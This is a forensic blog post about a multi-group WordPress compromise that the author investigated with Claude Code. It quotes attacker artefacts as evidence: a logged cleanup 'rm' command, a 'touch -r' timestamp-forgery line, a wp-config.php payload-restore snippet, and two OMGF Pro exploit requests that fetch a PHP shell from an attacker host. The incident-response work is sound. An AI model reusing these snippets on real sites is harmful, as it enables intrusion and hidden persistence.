@@ -1,0 +1,295 @@
+---
+title: 'Six Layers Deep: Two Days of WordPress Forensics with Claude Code'
+pubDate: 2026-08-07
+description: 'A customer of ours got hit. What started as "check these WordPress sites for one CVE" turned into three separate attacker groups, six layers of persistence, and 4.4 million fake product pages. Claude Code did the digging. Here is what it found, and where it was wrong.'
+tags: ['AI', 'Claude', 'Security', 'WordPress', 'Forensics', 'Agents']
+---
+
+import Note from '../../components/reads/Note.astro'
+
+Back in April I wrote about [migrating a production backend with Claude Code](/reads/slop-fork-migrating-python-backend-to-bun-with-claude-code). That was greenfield work with a safety net: tests, git, and a laptop that could not break anything real.
+
+This is the opposite. Yesterday morning a colleague found something ugly on a set of WordPress instances we host. By this evening we had 23 forensic reports, 26 GB of secured evidence, and a picture of the incident that looked nothing like the one we started with.
+
+I want to write about the two things that surprised me. First, how much of that digging Claude Code actually did. Second, how deep the compromise went, because I have been doing this job for a while and I have never seen an infestation with **six independent layers of persistence** that repair each other.
+
+<Note>
+  **☝️ Good To Know:** Everything here is anonymized. No customer, no server
+  names, no domains, no IP addresses, no timestamps that could identify anyone.
+  What stays is the technique, the numbers, and the method. The CVEs I mention
+  are public advisories.
+</Note>
+
+## The Setup
+
+The environment is shared hosting: a handful of servers, a few dozen vHosts, WordPress installations built up over the years by a number of different parties. We had SSH access and essentially no prior knowledge of what was inside any individual site. That is worth stating up front, because it shapes the whole method. Everything in this post, we learned by looking.
+
+The starting point was a spreadsheet from our hosting team listing vHosts and WordPress versions, plus two CVE identifiers. [CVE-2026-63030](https://nvd.nist.gov/vuln/detail/CVE-2026-63030), a route confusion bug in the REST batch endpoint, chained with [CVE-2026-60137](https://nvd.nist.gov/vuln/detail/CVE-2026-60137), a SQL injection in `author__not_in`. Together they are pre-auth RCE in the WordPress core, no plugin required, and the chain had picked up a name: [wp2shell](https://www.tenable.com/blog/wp2shell-cve-2026-63030-cve-2026-60137-frequently-asked-questions-about-remote-code-execution). Disclosed July 17, on the CISA KEV list by July 21. The brief was simple. Check which of these are vulnerable, check which of these are owned.
+
+I opened Claude Code in an empty directory and wrote a short `CLAUDE.md`. The relevant part:
+
+```markdown
+We are doing incident response for the hosts listed in ./data/hosts.csv,
+where there has been a potential compromise end of July.
+
+Do not touch evidence files. Commit directly to `main`.
+```
+
+That "do not touch evidence files" line, plus a rule I repeated in almost every prompt on day one, turned out to be the most important constraint of the whole engagement: **read-only, always**. No `sudo`, no writes, no `mysqldump`, no moving files around. Every SSH command was a `find`, an `ls`, a `stat`, or a `cat`. Every database query was a `SELECT`.
+
+The reason is boring and non-negotiable. If you modify a compromised system before you have secured it, you have destroyed evidence, and you will not get it back. Claude Code held that line for two days across 449 shell invocations without me having to re-litigate it.
+
+## Day One: Looking for Hex
+
+The first real prompt was crude:
+
+> login in to the first server via SSH and go to /var/www and check all wp-plugins sub-folder you can find that look suspicous (strange hex values in folder names, etc.)
+
+That found plenty. Plugin directories named `advanced-cache-handler-d5ffa5`, `media-optimization-core-eccd93`, `site-performance-toolkit-62b7f5`. Plausible-sounding names with a random hex suffix, which is a well-known pattern. Five compromised instances on the first server, one on the second, and by the afternoon a filesystem-level picture of 85+ malicious files.
+
+Here is the thing about that approach: **it very nearly missed an infected site.** One instance had no hex-suffixed plugin folder at all. Its infection lived entirely in `mu-plugins/`, and a search that keyed on folder names would have waved it through as clean. Claude Code caught it because it also grepped the must-use plugin directories, not because I asked it to.
+
+The same failure mode bit us again on day two. Two malicious plugins uploaded during a later session carried entirely innocuous names, and they were missing from the day-one evidence set. The database query found them, the filename pattern never would have.
+
+<Note>
+  **☝️ Good To Know:** Any IoC list that keys on naming conventions is a list of
+  the attackers you have already caught. It says nothing about the ones who
+  picked a boring name.
+</Note>
+
+## The Screenshot That Changed the Conversation
+
+On day two I asked about something that had been nagging at me in the logs: some sites were serving an enormous number of requests to paths that did not exist in the filesystem.
+
+Claude Code fetched one of those URLs four times with different `User-Agent` headers. Same URL, four results:
+
+| Client                       | Response                        |
+| ---------------------------- | ------------------------------- |
+| Chrome, desktop              | 404, the site's own error page  |
+| Googlebot                    | 301 to a generated product page |
+| Applebot                     | 301, same target                |
+| Googlebot, redirect followed | 200, 151 KB of HTML             |
+
+Then it did the same thing in a real Chromium via Playwright and took screenshots. The bot version rendered a **rebuild of a large American retailer's storefront**, visually and structurally: blue header bar, "Pickup or delivery?", department navigation, cart, star rating, free returns banner, product table with an ASIN field. Every place the retailer's brand name should have been, the customer's own domain was substituted. "Sold and shipped by" our customer.
+
+The star ratings, we later found in the generator's config, were literally `rand(40, 50) / 10`.
+
+Over four weeks these three sites had served **4,385,085 fake product pages** across **2,655,036 distinct URLs**, exceeding the real page count of those sites by several orders of magnitude. And because the delivery was cloaked by user agent, not one of those pages had ever been seen by a human being. Our own filesystem sweep on day one could not find them either, because there is no `/products/` directory anywhere. The pages are generated at request time and made discoverable through a `sitemap.xml` that also does not exist as a file.
+
+The two screenshots, same URL, one 404 and one fake storefront, ended up being the single most useful artifact of the entire engagement. You do not need to explain cloaking to a non-technical stakeholder if you can just put two pictures next to each other.
+
+One detail I keep thinking about: among the crawlers pulling those pages were ClaudeBot, GPTBot, and OAI-SearchBot. The fake inventory did not only go into search indexes.
+
+## 13 GB of Logs, and What Fell Out of Them
+
+Once our hosting team delivered the access logs, the work changed character. 191 files, 13 GB, later supplemented by a second collection of 2,380 files. This is the part where an agent stops being a convenience and starts being the only reason the analysis happens at all.
+
+A few of the things that fell out:
+
+**The initial breach is dated to the second.** One instance shows a `POST /wp-json/batch/v1` returning 207, then a plugin upload, then a successful request to the freshly installed backdoor. **47 seconds** from exploit to working shell, fully automated. Five instances fell inside 95 minutes, each from a different cloud IP.
+
+**The attackers cleaned up after themselves, in cleartext.** One backdoor variant accepted commands via `GET`, which means Apache logged them. Including this one:
+
+```
+rm -f .tmp_*  .????????????.php
+      _xp_*.php  _vx_*.php  _px_*.php
+      class-wp-cache-helper-*.php   class-wp-media-handler-*.php
+      class-wp-widget-core-*.php    class-wp-cron-handler-*.php
+      ... (thirteen `class-wp-*` families in all)
+```
+
+That is the attacker handing over the complete naming scheme of every file family they deploy. Claude Code took that list, scanned all four servers against it, and came back with 18 hits, every single one already in the day-one evidence set. That is the strongest confirmation we got that the filesystem sweep had been complete.
+
+**A `touch -r` in the logs killed a theory.** The same GET interface logged this:
+
+```
+touch -r ../../../../wp-includes/version.php class-wp-block-renderer-ec571d.php
+```
+
+More on why that mattered in a moment.
+
+**An error log 26 MB where it should have been 300 KB.** During the extended log collection, Claude Code noticed that the Apache error logs from the incident week were orders of magnitude larger than normal. It went looking. **134,148 of 134,173 lines** were the same message:
+
+```
+.htaccess: order not allowed in <FilesMatch> context
+```
+
+The attackers had written an Apache 2.2 syntax block into the document root's `.htaccess`, and Apache 2.4 rejected it on every single request. That noise led directly to discovering the sixth persistence layer, and it gave us something rarer: an **independent dating channel**. Because every request logs a line, you can bracket to the second the window in which a broken block was active, even if the file itself has since been replaced and its timestamp forged.
+
+## Six Layers
+
+Here is what the persistence actually looked like, once all the pieces were on the table:
+
+| #   | Layer               | Mechanism                                                           |
+| --- | ------------------- | ------------------------------------------------------------------- |
+| 1   | Plugin folder       | Disguised plugin directory with a hex suffix                        |
+| 2   | mu-plugins          | Must-use plugin that restores a deleted shell                       |
+| 3   | Backup copies       | Clones in `uploads/`, timestamps set to match a core file           |
+| 4   | User crontab        | `*/5` restore check, `*/30` heartbeat                               |
+| 5   | **`wp-config.php`** | Rewrites the payload out of the database on every page load         |
+| 6   | **`.htaccess`**     | Blocks `.suspected` and `.phtml`, one appended block per deployment |
+
+Layer five is the vicious one. `wp-config.php` is not part of the WordPress core, so a core update does not replace it. It loads before every plugin, so deactivating plugins does nothing. And the payload it restores lives in the `wp_options` table, so deleting files does nothing either:
+
+```php
+if (!file_exists('/var/www/<vhost>/tmp/<payload>')) {
+  $_o = @(new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME, DB_USER, DB_PASSWORD))
+     ->query("SELECT option_value FROM ".$table_prefix."options
+              WHERE option_name='_site_transient_health_<hex>'");
+  if ($_o && ($_r = $_o->fetch())) {
+    @file_put_contents('/var/www/<vhost>/tmp/<payload>', base64_decode($_r[0]));
+  }
+}
+```
+
+It authenticates to the database using the credentials that are already sitting in the same file. Elegant, in the way a thing you hate can be elegant.
+
+Layer six is the one that tells you who the attackers consider the enemy. The blocked extensions are `.py`, `.exe`, `.phtml`, and `.suspected`. That last one is what common malware scanners rename infected files to. **The block is not defending against attacks. It is defending against cleanup.** On the worst-hit instance there were **21 of these blocks stacked in one file**, each with a different hex marker, because every deployment appends a new one instead of replacing the old.
+
+Which brings me to the correlation that made the whole thing legible.
+
+## The Hex Was a Campaign ID
+
+Every artifact carried an eight-character hex marker. The `.htaccess` block. The mu-plugin filename. The `wp-config.php` comment. The database option key. The cron job comment.
+
+Claude Code noticed that two of the 21 `.htaccess` markers on one site matched exactly the markers of the two `WP_Core_Integrity` blocks in its `wp-config.php`. On another instance, the `.htaccess` marker matched the `wp-config.php` marker. On a third, it matched a mu-plugin filename.
+
+**The hex is a per-deployment campaign ID**, linking every artifact of a single rollout across four different layers of the system. Once you know that, any single artifact you find tells you which siblings to go looking for. That is a genuinely useful thing to know during cleanup, and I am fairly sure nobody would have spotted it by hand across four servers, two databases, and 13 GB of logs.
+
+A second correlation confirmed the payload chain end to end. The malware on disk is 93,952 bytes. The base64 blobs in `wp_options` are 125,272 bytes. Decoded, that is exactly 93,952 bytes. Same file, two locations, proven arithmetically rather than assumed.
+
+## It Was Not a Webshell. It Was a Framework.
+
+The payload turned out to be 94 KB of PHP, present in **66 bit-identical copies** across both servers, 57 of them on a single instance. Every function prefixed `_nx_`. The inventory reads like a product feature list:
+
+- command execution with a fallback cascade through `shell_exec`, `exec`, `passthru`, `system`, `proc_open`, `popen`
+- `LD_PRELOAD` bypass for `disable_functions`
+- six persistence functions, one per layer above
+- timestamp forgery, decoy writes, self-hiding from the plugin list
+- WordPress admin creation, both through the API and directly in the database
+- an unauthenticated REST route registered with `permission_callback => __return_true`
+- a function called `_nx_neutralize_security` that renames the directories of **15 named security plugins** and deletes WAF files
+- a function called `_nx_rival_hit`, aimed at competing malware
+
+That last one is not a joke. On these servers, multiple groups were active simultaneously and actively working against each other. One of them **updated WordPress core themselves** through wp-admin, on the same day a competing group had exploited the same instance. Another **patched the plugin vulnerability they came in through**, to lock the door behind them.
+
+Which produced the single most counterintuitive finding of the whole investigation: four of the six compromised instances were running the _patched_ WordPress version. If you had assessed this incident by version numbers, you would have written off four actively compromised sites as clean.
+
+<Note>
+  **🔥 Hot Tip:** A current version number is not evidence of integrity. It can
+  be the malware's own work. Check for artifacts, not for patch levels.
+</Note>
+
+As for `_nx_neutralize_security`: searching both servers for its traces came back empty. Not because the function failed, but because none of those 15 plugins was there to disable. That is a small window into how these frameworks are built. The capability ships regardless of the target, because the same payload has to survive landing on a hardened installation as well as a bare one. Its author is writing for an estate they have never seen, which is the same problem we had, from the other side.
+
+## Where Claude Code Was Wrong
+
+This is the section I actually care about, because an agent that never contradicts itself in a forensic investigation is one that is confidently wrong somewhere and nobody has noticed yet. Six findings were retracted over the two days, each documented as a retraction in the reports alongside the evidence that overturned it.
+
+**"There was a second, older breach in December 2025."** Day one flagged artifacts dated `2025-12-07`, and it went into the first report. The tell came from the second server, where 24 files carried the _same second_. Every artifact turned out to carry the mtime of `wp-includes/plugin.php` **from its own instance**, which is precisely what the installer's `@touch(..., filemtime(...))` produces. No December breach.
+
+**"All timestamps are forged, so file dates are worthless."** The overcorrection that followed, also wrong. Files deployed during one specific week matched their log entries to the second, because the stomping was selective. The refined version beats both extremes: timestamps are reliable exactly where they agree with the logs, which turns the comparison itself into a test.
+
+**"The guardian payload targets do not exist."** Day one ran `ls /var/www/*/tmp/php*`, got nothing, and concluded the restore targets were gone. Day two reproduced the command and worked out why: those directories are mode 750 and owned by the individual vHost accounts, so our read-only account cannot traverse them, the shell never expands the glob, and `ls` reports "no such file" **with exit code 0**. A false negative indistinguishable from a real one. The files were there the whole time.
+
+**"The attacker used stolen administrator credentials."** Survived about four hours, until the real entry vector turned up. On one site there is no login in the logs at all, because the session was minted directly by the dropped webshell.
+
+**"These two mu-plugins are legitimate."** Correctly copied, correctly hashed, and waved through because one carried the header and author line of a real extension. They were the first campaign's backdoors, sitting in our own evidence set for a day.
+
+**"The evidence collection from the second server is complete."** Missing two plugins, for the naming reason above.
+
+I find that list reassuring rather than worrying. Every one was caught by the same process that produced it: keep collecting, keep cross-checking, write down what changed. A two-day investigation with zero retractions is the one I would not trust.
+
+## Three Incidents, Not One
+
+By Friday afternoon the shape of the thing had changed completely. We were not looking at one break-in.
+
+|         | Incident A                    | Incident B     | Incident C              |
+| ------- | ----------------------------- | -------------- | ----------------------- |
+| Start   | **June 25**                   | July 19        | July 20                 |
+| Entry   | Plugin CVE, unauthenticated   | Core RCE chain | Existing access         |
+| Purpose | SEO cloaking, fake storefront | Remote access  | Spam relay, persistence |
+| Sites   | 4                             | 5              | the same 5              |
+
+The entry vector for A, found late on day two, is the part that still bothers me. It is [CVE-2026-57700](https://nvd.nist.gov/vuln/detail/CVE-2026-57700), an unrestricted file upload in OMGF Pro, the paid tier of a widely used plugin for hosting Google Fonts locally, scored **10.0 critical** by Patchstack. The free version is not affected. Two GET requests, no authentication:
+
+```
+GET /?omgf_optimize=1&omgf_pro_auto_config=1&s=@import url(https://<attacker>/kk.php)
+GET /wp-content/uploads/omgf/<attacker>/kk.php
+```
+
+The plugin scans the rendered page for stylesheet references so it can host fonts locally. It obediently fetches the file named in the injected `@import` and saves it **under its original name, including the `.php` extension**. The second request executes it. The dropped file even sniffs the `User-Agent` to tell whether the plugin is fetching it (serve innocent CSS) or someone is calling it directly (load WordPress, mint an admin session).
+
+The vendor fixed this in a release published on **June 25**. Our first successful exploitation is logged at **08:32 that same morning**. Three requests, seven seconds: the injected `@import`, the call that executes the dropped file, and then a `200` from a REST route that had not existed eight seconds earlier.
+
+To his credit, the plugin author published a full technical breakdown of the incident rather than a terse changelog entry: [OMGF Pro v5.2.7 Closes the Breach](https://daan.dev/blog/wordpress/omgf-pro-exploit-breakdown/). I had Claude Code read it and diff it against our own findings, which turned out to be the fastest validation of the whole investigation. The payload source domains, the DigitalOcean attacker IP, the REST route the payload registers, the two backdoored files it drops into `mu-plugins/`, the randomly named webshell in a dated uploads folder, and the fact that the payload **patches the vulnerability behind itself** to lock out competitors: all of it matched what we had reconstructed independently from logs and disk.
+
+One item did not match. The vendor describes the payload creating a rogue administrator called "Yuna Mochi." We never found that account on any instance. I still do not know whether the campaign changed between June and our look at it, or whether that step simply failed here.
+
+Worth sitting with for a second: the patch and the exploitation are the same date. There was no window here in which updating would have made a difference. And the entire rest of the incident, all three groups and everything downstream of them, unrolls from that one plugin on one site among the dozens sharing these machines.
+
+## Twenty-Six Administrators
+
+Reading the user tables across the five instances produced the number that made the room go quiet. There were 32 accounts in total, and **26 of them belonged to the attackers**. All but one carried the administrator role. On one site it was 13 out of 14, meaning a single legitimate login against thirteen hostile ones.
+
+Two of those accounts had been created well after the documented attack waves ended, one of them two days before we started looking. That closed a question the final report had listed as unresolved: whether anyone was still moving around on that box in the days before we noticed. They were.
+
+The oldest trick in the pile: on two instances, attacker accounts carried a registration date **byte-identical to the real administrator's, from 2015**. Backdating in the database, the same idea as the forged file timestamps. Account age is not a filter, which is worth knowing before you sort a user list by creation date and trust the top of it.
+
+## The Boring Part That Made It Usable
+
+None of the above is worth anything if the evidence does not hold up. Every collection got its own directory, a `SAMMELPROTOKOLL.md` chain-of-custody document, and a `MANIFEST.sha256`.
+
+The numbers on the biggest one: 2,380 files verified against hashes taken server-side _before_ transfer. 2,375 exact matches, 5 verified as exact prefixes (log files that were still being appended to during collection, where a prefix match is the strongest proof available without write access), **zero deviations**.
+
+That prefix check is a nice example of the agent proposing something better than what I asked for. I would have shrugged at the five mismatched hashes and written "file was in use." Verifying the copy as a byte-exact prefix of the source is the thing that actually survives a challenge.
+
+The reports themselves were written in German, for a German customer, in the register that internal IT reports get written in here. That is a small thing that saved me hours. Twenty-three reports, five of them exported as client-ready PDFs, all of them cross-referenced to each other and to the evidence directories.
+
+## The Numbers
+
+| Metric                       | Value                |
+| ---------------------------- | -------------------- |
+| Calendar time                | 2 days               |
+| Main session wall clock      | ~26 hours            |
+| Prompts I typed              | 95                   |
+| Assistant turns              | 1,322                |
+| Shell invocations            | 449                  |
+| Background subagents         | 1                    |
+| Reports written              | 23 Markdown, 5 PDF   |
+| Evidence collections         | 11 (~26 GB)          |
+| Files integrity-checked      | 2,380 (0 deviations) |
+| Servers examined             | 4                    |
+| WordPress instances examined | 21                   |
+| Compromised instances found  | 6                    |
+| Output tokens                | ~2.1M                |
+| Cache read tokens            | ~472M                |
+| Model                        | Claude Opus 5        |
+
+The single background subagent is worth a note. Late morning on day two I asked for an extended log collection from two servers, which is pure mechanical work: enumerate, hash server-side, pull, verify, write the protocol. That ran as a separate agent in the background while the main session kept doing analysis. It also did something I had not asked for. While cross-checking coverage, it noticed that four weeks of access logs existed only for the three cloaking sites and were missing for the other 16 vHosts, and pulled them too. Those four weeks turned out to contain the start of the cloaking infestation.
+
+## What I Take Away From This
+
+**Read-only is a constraint the agent can actually hold.** Two days, 449 shell commands, four production servers, zero writes. I stated it once in `CLAUDE.md` and reinforced it in maybe a third of my prompts. That is a policy I could not have enforced as reliably on myself at 11pm on day two.
+
+**The value is in correlation, not in any single lookup.** Every individual thing Claude Code did here, I could have done. Grep a log, stat a file, run a SELECT. What I could not have done is hold the access logs, the error logs, the mail logs, the crontabs, the database, and the filesystem in view simultaneously and notice that a hex string in an `.htaccess` comment matches a database option key. That is where the two days came from.
+
+**Ask for the negative result too.** The most valuable single question I asked on day two was essentially "why did this command return nothing?" The answer was a permissions quirk that had produced a false negative disguised as a clean bill of health. Agents will happily report "no matches found" as a finding. It is worth making them prove that no matches means no matches.
+
+**Write the reports as you go, not at the end.** Every finding got committed as its own report with its own timestamp, and later reports explicitly supersede earlier ones instead of rewriting them. When day two overturned half of what day one had concluded, nothing had to be quietly edited. The December-2025 claim is still sitting there in the day-one report, with the day-two report next to it explaining why it was wrong. That is the difference between a correction and a cover-up, and it matters a lot when the earlier version has already gone to the customer.
+
+**A compromise this deep is not a cleanup job.** Six persistence layers, payloads in the database, cron entries outside the document root, and 26 attacker admin accounts. We rebuilt from scratch on fresh vHosts with new system accounts, restored content from a backup predating the earliest proven access, threw away everything except the media directory, generated a new `wp-config.php`, updated core, plugins and theme, and put a licensed security plugin in front of it. Then Claude Code ran an independent release check against the cleanup checklist before the site went back online, and that check turned up leftover WooCommerce demo entries nobody had noticed. Having something audit the restore that was not involved in performing it is worth the extra half hour.
+
+## One Last Thing
+
+The question that came back afterwards was the obvious one: could this have been spotted sooner?
+
+Not the first move. The vendor shipped the fix and the attackers used the hole on the same date, which is about as small as a patch window gets.
+
+What stays with me is the rest of it. The cloaking ran for **more than four weeks**, peaking at 173,784 fake pages in a single day, and every one of those requests was written to a log file as it happened. The evidence was sitting on disk from the first morning. What was missing was anything reading it.
+
+That is the part with a lesson in it, and it is not really about WordPress. A compromise built to be invisible to humans, serving one thing to crawlers and another to browsers, does not announce itself. It surfaces as a directory that is the wrong size, or an error message repeated 134,148 times, or a plugin folder with a name that is very slightly off. All of that is machine-readable. None of it is human-readable at that volume, which is precisely why it sat there.
+
+Two days of an agent with SSH access and a read-only rule reconstructed the whole thing, minute by minute, including its own six wrong turns. When you are standing in the wreckage on a Thursday morning with 26 GB of logs and no idea what you are looking at, that is a very good thing to have.
+
+It also leaves me with a better question than the one I started with. Not whether an agent can do forensics after the fact, but what the same tooling would turn up if you pointed it at a healthy estate on an ordinary Tuesday.
